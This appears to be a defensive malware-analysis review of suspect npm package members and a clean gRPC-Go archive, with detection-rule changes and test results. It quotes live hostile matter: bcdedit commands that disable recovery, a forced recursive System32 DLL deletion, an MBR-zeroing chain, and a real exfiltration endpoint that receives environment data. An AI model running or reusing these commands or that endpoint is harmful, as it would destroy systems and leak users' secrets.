# Stranded member review, 2026-10-24

All four listed stranded JavaScript members are **MALICIOUS**, based on their
own source bytes. The three supplied archive convictions are retained without
rejudgment. The gRPC archive presents a significant evidence discrepancy:
**all 802 members are byte-identical to the official gRPC-Go v1.57.0 module**.
Forager verified that reference against sum.golang.org. No hostile rule is
justified by those source bytes. The source of the archive conviction and its
deployment context were not supplied.

## Execution paths and effects

* **parser-session writer.js** snapshots the entire environment, package
  submodule version, OS platform, hostname, username and the MACs of external
  IPv4 interfaces. Its hex-pair decoder resolves the table to `require`,
  `axios`, `post`, an HTTPS endpoint, `headers`, `x-secret-header`, `secret`,
  and `then`. The exported arrow ignores its arguments, posts that record,
  evaluates the response's `data` property and discards rejections. The
  endpoint is `https://log-server-lovat.vercel.app/api/ipcheck/703`. Concealing
  whole-environment export and remote-source evaluation inside apparent
  logging/session code establishes malicious intent. The extraction lacks the
  `src/package.json` required by this member, and its entrypoint refers to a
  missing `.pnpm/httpreslog` writer. Successful activation is not established.
* **osinthell p.js** exports an action that lists C:, D:, E: and F: roots,
  joins each entry to its drive, checks for a regular file, then overwrites
  that same path with an empty string using Node's default truncating mode.
  It does not recursively traverse subdirectories. Every error is swallowed.
  This destroys arbitrary drive-root file contents rather than performing the
  declared utility's user-directed work.
* **osinthell t.js** exports a silent zero-argument action that runs both
  `bcdedit /set {default} bootstatuspolicy ignoreallfailures` and
  `bcdedit /set {default} recoveryenabled No`. Both child streams and caught
  errors are discarded. The fixed paired recovery sabotage, with no repair or
  configuration interface, tips the individual malicious judgment.
* **osinthell v.js** exports a silent zero-argument action running
  `del /F /S /Q C:\\Windows\\System32\\*.dll`. Its forced, quiet, recursive
  system-library deletion is the destructive effect; no elevation mechanism
  is implemented or inferred. Permissions may prevent success.
* **osinthell context and additional missed effect:** `sorgu(userId)` ignores
  its argument and invokes a-z modules in sequence. Earlier modules include
  file deletion, OS-directory removal, process termination, resource
  exhaustion and disk sabotage. `f.js` opens `\\.\PhysicalDrive0` in `r+`,
  creates 512 zero bytes and writes that buffer to the same handle at disk
  offset zero, then tries `bootrec /fixmbr`. The subsequent command does not
  restore the partition-table bytes cleared by the preceding operation.
  Added detection binds the handle, zero buffer, length and offset inside a
  silent exported action. `j.js` has a synchronous endless allocation loop
  before the later p/t/v calls. Their invocation in the complete package is
  therefore not proven to occur, although each member implements its attack.
* **gRPC-Go archive:** the declared module remains `google.golang.org/grpc`.
  Dialing resolves configured targets and constructs HTTP/2 RPC transports;
  TLS/ALTS authentication, metadata handling and load balancing implement the
  library's advertised purpose. The shell command in the grpclb fallback
  interop client comes from its explicit test flag. Windows PowerShell queries
  the BIOS manufacturer for cloud-platform selection. Build scripts fetch
  protobuf/toolchain inputs and run tests. Private keys are test fixtures;
  TLS-verification bypass settings occur in tests and custom verification
  paths. Upstream equivalence corroborates these inspected paths. It does
  not establish anything about an unprovided consuming application.

No specimen code, destructive command or remote payload was executed. Static
source tracing and `cleave facts` were used, including decoded text, call
arguments and flow limitations. All supplied hashes were verified.

## Counts and classifier comparisons

Counts are distinct trait IDs on the scanned root. Archive findings inherited
from members are counted once. H = hostile; S = suspicious.

| Artifact | H before → after | S before → after | Classifier before → after |
| --- | ---: | ---: | --- |
| parser-session archive | 4 → 5 | 3 → 4 | hostile → hostile |
| writer.js | 4 → 5 | 3 → 4 | hostile → hostile |
| osinthell archive | 5 → 6 | 9 → 10 | hostile → hostile |
| p.js | 2 → 2 | 1 → 1 | benign → benign |
| t.js | 1 → 1 | 3 → 3 | suspicious → suspicious |
| v.js | 1 → 1 | 3 → 3 | suspicious → suspicious |
| gRPC-Go archive | 0 → 0 | 0 → 0 | benign → benign |

The p/t/v classifier disagreements remain despite accurate hostile behavior
coverage. Adding duplicate rules or changing accurate severities to increase a
score would not correct them. Each small member implements one destructive
result, so the 3–5-hostile goal cannot be met with distinct supported attacks:
p's truncation, t's recovery sabotage and v's system-library deletion are
covered, as are their execution, deletion, stream suppression and error-handling
primitives. Existing overlapping accurate traits are preserved. No missing
stage, persistence, exfiltration or privilege-escalation effect is evidenced in
these three members. The archive conviction/classifier discrepancy for gRPC
cannot be repaired with an evidence-supported hostile matcher.

## Corrections and retained coverage

* Added platform-specific theft coverage binding `os.platform()` to the actual
  concealed POST record. Hostile promotion also requires the existing covert
  whole-environment export. Ordinary platform telemetry alone stays suspicious.
* Added the previously missed silent physical-disk first-sector zeroing chain
  in osinthell f.js, including its inherited archive finding.
* Moved `go-many-fragment-joins` to
  `metadata/lang/source/syntax/call/arguments::go-repeated-short-string-argument-prefixes`.
  Its actual gRPC matches are six normal `metadata.Pairs` argument lists,
  not string joining or evasion. Retained notable severity, platform/type scope,
  threshold and exclusions. Removed unsupported T1027/B0032 mappings. Factoring
  an identical repeated regex group preserves exact matches while reducing its
  length from 90 to 64 bytes. Updated the exact Go recovery consumer. The four
  ancestor consumers are JS/TS or ELF scoped and cannot receive this Go rule.
* Changed the Metadata-Flavor description from a send claim to a header
  reference. Its text matcher and notable severity are unchanged.

There are **no material attack detection losses**. Every analysis unit was
compared before/after: only the two added chains and the Go ID relocation alter
trait sets; the header description changes without changing its matches.
Full per-artifact counts, model probabilities, marker notes, hashes and member
deltas are in `review.json`. Raw scans/facts and the fetched reference with its
Forager provenance remain in the task's scratch/stranded-review directory.

## Focused verification

Run `python3 testdata/stranded-oct24-review/check.py`: 43 assertions across 22
positive/negative cases cover renamed bindings, unrelated source records,
non-POST methods, missing environment-export context, mismatched disk handles
and buffers, nonzero writes, later sectors, file images and logged errors.
The real gRPC header test source is the benign placement control; the Go
construction/credential-harvest control checks the retained consumer.

The existing stranded-members suite passed 36 assertions across 20 analyzed
files. Existing out-of-batch environment-exfiltration, writer and DLL-wipe
fixtures retain their attack findings; visible DLL servicing and unrelated
writer bodies keep only their supported behavior. No pre-existing Go fixture
matched the moved regex; exact match-span preservation was checked on 1,022 Go
files and 10,000 generated argument lists rather than erasing that observation.
